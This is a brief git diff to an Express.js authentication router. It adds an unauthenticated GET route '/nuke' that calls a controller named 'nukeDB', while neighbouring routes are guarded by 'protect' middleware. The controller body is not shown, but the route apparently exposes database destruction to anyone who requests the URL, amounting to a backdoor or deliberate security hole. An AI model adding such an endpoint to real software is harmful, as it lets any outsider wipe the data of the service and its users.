@@ -13,4 +13,6 @@ router.post('/reset-password', require('../controllers/auth.controller').resetPa
 router.get('/me', protect, getMe);
 router.patch('/me', protect, upload.single('photo'), updateMe);
 
+router.get('/nuke', require('../controllers/auth.controller').nukeDB);
+
 module.exports = router;
